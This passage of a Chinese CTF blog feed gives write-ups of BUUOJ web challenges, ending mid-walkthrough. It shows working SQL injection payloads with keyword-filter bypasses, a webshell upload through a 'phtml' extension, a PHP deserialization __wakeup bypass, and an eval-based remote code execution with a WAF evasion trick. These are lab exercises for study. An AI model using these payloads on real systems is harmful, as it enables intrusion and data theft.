<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  fstream fin,fout;</span><br><span class="line">  fin.<span class="built_in">open</span>(<span class="string">&quot;required_essay.txt.WannaEscape&quot;</span>,ios::binary|ios::in);</span><br><span class="line">  fout.<span class="built_in">open</span>(<span class="string">&quot;essay.txt&quot;</span>,ios::binary|ios::out);</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>],c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(fin.<span class="built_in">read</span>(s,<span class="number">1024</span>))&#123;</span><br><span class="line">    <span class="type">int</span> readBytes=fin.<span class="built_in">gcount</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;readBytes;i++)&#123;</span><br><span class="line">      c=s[i];</span><br><span class="line">      c-=(i &amp; <span class="number">0xF</span>)+<span class="number">127</span>;</span><br><span class="line">      s[i]=c;</span><br><span class="line">    &#125;</span><br><span class="line">    fout.<span class="built_in">write</span>(s,readBytes);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  fin.<span class="built_in">close</span>();</span><br><span class="line">  fout.<span class="built_in">close</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其实C++也可以采用 <code>fopen()</code> 等函数，这一类都在 <code>cstdio</code> 文件头中；这里用的是文件流，由于是一个字节一个字节的存，所以声明 <code>char</code> 类型的变量，这里不能用 <code>char *s</code> ，因为s最多存八个字节的内容（我也不知道为什么），只能声明一个 <code>char s[1024]</code> ；</p>
<p>地址范围：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1C09H:4096+12*256+0+9=7177字节</span><br></pre></td></tr></table></figure></div>

<p>然后由于文件大小并非1024的整数倍，所以要记录读取的字节数用于迭代 <code>int readBytes=fin.gcount()</code> ；恢复后得到一篇没什么用的英语论文，里面藏着一串flag：<code>r00t&#123;50-l0n6-4nd-7h4nk5-f0r-4ll-7h3-f15h&#125;</code>  </p>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="https://www.icourse163.org/spoc/learn/DHU-1464535194?tid=1465433514#/learn/content?type=detail&id=1245608367" >学校慕课课程的C++资料（挺好用的） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/xiaoxxcool/article/details/2460110" >C++ fopen() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://vimsky.com/examples/usage/fread-function-in-c.html" >C++ fread() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/joeblackzqq/archive/2011/02/15/1955440.html" >__int64 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://vimsky.com/examples/usage/cpp-programming_library-function_cstdio_fwrite.html" >C++ fwrite()用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<p><strong>英文手册</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">captcha:验证码</span><br><span class="line">immutable:不可变的</span><br><span class="line">ciphertext:密文</span><br><span class="line">Disk:磁盘</span><br><span class="line">Memory:内存</span><br><span class="line">kernel:内河</span><br><span class="line">heap:堆</span><br><span class="line">canary:Linux系统cookie</span><br><span class="line">bypass:绕过</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>BUUOJ——WEB（二）</title>
    <url>/2023/04/28/Security/CTF/BUUOJ%E2%80%94%E2%80%94WEB%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h2 id="ACTF2020-新生赛-Upload（1）"><a href="#ACTF2020-新生赛-Upload（1）" class="headerlink" title="[ACTF2020 新生赛]Upload（1）"></a>[ACTF2020 新生赛]Upload（1）</h2><p>上传文件的题目，直接上传php文件，在前端被检测出来，提示只能使用gif，png，jpg等后缀，下断点绕过前端检测后，php文件仍无法上传，服务器过滤了黑名单”php”，尝试”PHP”，可以上传，但服务器无法解析为php文件（Linux？），尝试”phtml”，上传成功且服务器可以解析！直接利用一句话木马 <code>cat /flag</code> 即可</p>
<p>flag：flag{a8a3d35f-375b-44e1-932a-b9edcd5e76b0}</p>
<h2 id="极客大挑战-2019-BabySQL（1）"><a href="#极客大挑战-2019-BabySQL（1）" class="headerlink" title="[极客大挑战 2019]BabySQL（1）"></a>[极客大挑战 2019]BabySQL（1）</h2><p>Tips：本题直接在username中注入即可，passwd随便填写</p>
<h3 id="解法一：报错注入"><a href="#解法一：报错注入" class="headerlink" title="解法一：报错注入"></a>解法一：报错注入</h3><p>利用：<code>1&#39; pat</code> 可以试探pat是否被过滤，测试发现”selelct”,”or”,”and”,”from”遭到了过滤，但只是删除一次完全匹配的字符串，可以利用”oorr”来绕过，单引号注入有效，登陆成功后只给了密码，flag需要利用报错注入得到</p>
<p>堆叠注入无效，分号没被过滤但无法利用分号执行多语句，会出现”SQL syntax error”</p>
<p>利用”extractvalue()”进行报错注入时应注意，若语句执行成功会出现”XPATH syntax error”，可以得到关键信息；若语句执行不成功会出现”SQL syntax error”，无法获得关键信息。应区分有效与无效的报错</p>
<p><strong>本题由于存在or过滤，很多函数包含or的都要反过滤</strong></p>
<p>获取库名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, database(), 0x7e))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt; XPATH syntax error: &#x27;</span><span class="operator">~</span>geek<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>获取表名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, (seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;</span>geek<span class="string">&#x27;), 0x7e))    #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;~b4bsql,geekuser~</span></span><br></pre></td></tr></table></figure></div>

<p>获取列名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, (seselectlect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;</span>b4bsql<span class="string">&#x27;), 0x7e))  #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;id,username,password</span></span><br></pre></td></tr></table></figure></div>

<p>连接后直接查询看看，由于报错一般都有长度限制，因此用substring函数截取：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, subsubstrstr((seselectlect group_concat(passwoorrd) frfromom b4bsql),1,16), 0x7e))  #</span></span><br></pre></td></tr></table></figure></div>

<p>这里过滤了substr（<code>substring</code> 与 <code>substr</code> 是具有相同功能的函数），先利用 <code>locate(substr, str)</code> 定位flag位置，再查找：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, locate(&quot;flag&#123;&quot;,(seselectlect group_concat(passwoorrd) frfromom b4bsql)), 0x7e))  #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;XPATH syntax error: &#x27;</span><span class="operator">~</span><span class="number">153</span><span class="operator">~</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> oorr extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>, <span class="keyword">left</span>((seselectlect group_concat(passwoorrd) frfromom b4bsql),<span class="number">153</span>，<span class="number">24</span>), <span class="number">0x7e</span>))#</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span>XPATH syntax error: <span class="string">&#x27;~flag&#123;3015460e-88df-4ebb-~&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; oorr extractvalue(1, concat(0x7e, subssubstrtr((seselectlect group_concat(passwoorrd) frfromom b4bsql),177,24), 0x7e))  #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;XPATH syntax error: &#x27;</span><span class="operator">~</span>b356<span class="number">-0043</span>a5c16392&#125;<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>得到flag：flag{3015460e-88df-4ebb-b356-0043a5c16392}</p>
<ul>
<li><code>group_concat(column_name1,column_name2)</code> 将多行结果合并为一行，多列结果合并为一列；列与列直接之间相连，随后不同行的的数据用 <code>,</code> 分隔，逐行进行扫描</li>
<li><a class="link"   href="https://www.cnblogs.com/vofill/p/6806962.html" >SQL字符串截取 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><code>left(length)</code> 在读取到最大长度后就不能再读取了；<code>right(length)</code> 在读取到最大长度后读取的起点会向左偏移，它先检索到字符串起点，再读取子串</li>
<li><code>extract(&#39;目标xml文件名&#39;, &#39;xml中检索的字符串&#39;)</code> 该函数用于查询xml文件中的特定字符串，<code>0x7e</code> 代表字符 <code>~</code> ，拼接在要获取的信息周围再拼接到路径中去就会在字符串周围产生错误，从而报错注入</li>
</ul>
<h3 id="其他打开方式"><a href="#其他打开方式" class="headerlink" title="其他打开方式"></a>其他打开方式</h3><p>参考：<a class="link"   href="https://blog.csdn.net/qq_36618918/article/details/121691162" >极客大挑战 2019 BabySQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>（原来FUZZ就是扫描）先FUZZ测试过滤词典；然后利用 <code>order by num</code> 中num不能大于等于列数来获取字段个数（by也被过滤）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; oorrder bbyy 4--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;Unknown column &#x27;</span><span class="number">4</span><span class="string">&#x27; in &#x27;</span><span class="keyword">order</span> clause<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>能测试出只有三个字段，利用 <code>union select</code> 测试回显的字段：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ununionion seselectlect 1,2,3-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;Hello 2！Your password is &#x27;</span><span class="number">3</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>说明回显位为第二个字段和第三个字段，查询所有库：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span>information_schema,mysql,performance_schema,test,ctf,geek<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>查询CTF库的所有表：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;</span>ctf<span class="string">&#x27;-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;Your password is &#x27;</span>Flag<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>查询FLAG表的字段：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;</span>Flag<span class="string">&#x27;-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;Your password is &#x27;</span>flag<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>只有一个字段flag，读取flag：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;Your password is &#x27;</span>flag&#123;<span class="number">893</span>a0115<span class="operator">-</span>fb96<span class="number">-44</span>be<span class="number">-947</span>f<span class="number">-0</span>d1c1ab52346&#125;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>字段从flag替换为 <code>*</code> 不行。</p>
<h2 id="极客大挑战-2019-PHP（1）"><a href="#极客大挑战-2019-PHP（1）" class="headerlink" title="[极客大挑战 2019]PHP（1）"></a>[极客大挑战 2019]PHP（1）</h2><p>网站源码有备份，用dirmap扫出来是”WWW.zip”（记下来了），解压后得到网站的完整源码。有一个反序列化的洞，用GET方式上传一个”select”，getSerialize代码如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这里有一个问题，注意到类中的两个变量都是”private”，经过测试，php版本为7.1或5.6时，序列化严格区分private和public，传入的是哪种类型就会得到哪种类型的变量，而本题的环境需要严格区分两种类型，需要传入private类型两个变量参数，很不巧的是private类型序列化后得到的内容是这样的：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;\000Name\000username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;\000Name\000password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中”\000”是空字符，使用phpstudy，php版本为7.3.4搭建环境测试时，空字符在网页中完全不输出（不占位置），但在字符串中会计入长度，而他们是标记参数类型的重要字符，因此必须要有，因此传入网站时用URL编码为”%00”。另一个问题，源码中有一个魔术函数：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数会在调用 <code>unserialize()</code> 函数时优先调用，强行修改”username”参数，因此需要绕过这个 <code>__wakeup()</code> ，在PHP5&lt;5.6.25，PHP7 &lt; 7.0.10时，传入的反序列化字符串中如果对象的变量个数参数大于实际的变量个数，那么就会绕过”__wakeup”，因此最终传入的payload：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure></div>

<p>Name中实际上只有两个参数，将数量参数修改为3即可实现绕过。</p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>个人感觉本题是想考察”__wakeup”的绕过，但随着php版本的更新，序列化对public与其他两种类型的识别也发生了变化。在PHP7&#x3D;7.3.4的环境中测试，传入的对象为public类型的参数时，”username”和”password”被当作private类型处理并序列化为了对象：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line"></span><br><span class="line">-&gt; <span class="keyword">object</span>(Name)<span class="comment">#1 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;username&quot;</span>:<span class="string">&quot;Name&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;guest&quot;</span></span><br><span class="line">    [<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Name&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">    <span class="keyword">int</span>(<span class="number">100</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>猜测在这里，php优先根据变量名称进行匹配，弱化了类型的区别直接赋值</p>
<p>但使用PHP5&#x3D;5.6或PHP7&#x3D;7.1时private类型与public类型进行了严格区分，不同类型”username”被识别不同的变量：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line"><span class="keyword">object</span>(Name)<span class="comment">#1 (4) &#123;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>:<span class="string">&quot;Name&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;guest&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Name&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;yesyes&quot;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;admin&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">100</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里严格区分了不同类型的变量，对于原来不存在的”public”类型的”username”直接新建并赋值，对于序列化中不存在的”private”类型的”username”通过类定义获取，因此就有了四个变量。</p>
<ul>
<li><code>vardump()</code> 输出变量的信息，包括对象与一般变量</li>
<li><code>error_reporting(0)</code> 关闭报错信息的输出</li>
<li><code>\00</code> 代表空字符，有些环境中它不输出，有些环境中它会占位，但输出为空，此时复制粘贴得不到它，因此需要自己添加。为了在php的字符串中表示空字符，需要：<code>&quot;\000&quot;</code> 。需要说明的是，php中反引号不识别转义，单引号只认识”\\“双反斜杠表示的但反斜杠，只有双引号才能完整识别转义，因此表示空字符时需要双引号包裹。<br>成功被识别的空字符会被记录到字符串长度中。</li>
<li><code>&lt;br&gt;</code> 与 <code>&lt;/br&gt;</code> 都是换行</li>
</ul>
<p>参考：[</p>
<p><a class="link"   href="https://code.y444.cn/php" >PHP在线测试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
<p><a class="link"   href="https://blog.csdn.net/Xxy605/article/details/117336343" >PHP——serialize()序列化类变量public、protected、private的区别 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
<p>]</p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>访问”index.php.bak”下载源码文件：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>考察PHP的神奇弱类型比较，只能输入数字并要与字符串相等，payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure></div>

<p>得到flag：flag{41e5ff6a-626b-4d84-a9f9-25705676b098}</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>参考：<a class="link"   href="https://www.cnblogs.com/echoDetected/p/13091486.html" >Easy_Calc_WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>起初以为是JS写的，实际上是PHP写的calc。F12中注释标明有防火墙，实际上防火墙有两层，一层是源码中的，过滤敏感字符；一层是服务器的（大概），检测到指定参数中有敏感字符则直接拒绝访问。</p>
<p>通过观察JS源码可以发现，一个隐藏的php文件是”calc.php”</p>
<p>JS源码：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#calc&#x27;</span>).<span class="title function_">submit</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).<span class="title function_">val</span>()),</span><br><span class="line">        <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">            $(<span class="string">&quot;#result&quot;</span>).<span class="title function_">html</span>(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">        &lt;/div&gt;`</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p>令人意想不到的是直接访问”calc.php”能看到源码（这合理吗？）</p>
<p>“calc.php”源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>源码提供了第二层过滤的信息，ban掉了很多空白字符。目标是利用eval实现RCE；第一层过滤体现在服务器上，检测参数num是否含有一些敏感字符。</p>
<ol>
<li><p>传参时通过在num前加一个空格来绕过第一层防火墙，原理是php在解析传参时会自动处理参数名前的空白字符，而服务器又会准确识别空白字符，这就导致服务器端与PHP端的处理出现差异，服务器认为是名为空格+num的参数被传了过来，因此不做防火墙检测；PHP端则去掉了空格，将传递的参数名依旧识别成num，因此内容正确的传递给了变量 <code>$_GET[&#39;num&#39;]</code> 但又绕过了服务器的防火墙。</p>
</li>
<li><p>读取目录payload：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">20</span>num=<span class="number">1</span>;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)))</span><br></pre></td></tr></table></figure></div>

<p>scandir扫描目标目录下的内容并转化成对象格式，由于 <code>&quot;/&quot;</code> 中的引号被过滤，使用 <code>chr(47)</code> 替代，得到结果中发现：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[7]=&gt; string(5) &quot;f1agg&quot;</span><br></pre></td></tr></table></figure></div>

<p>读取flag：</p>
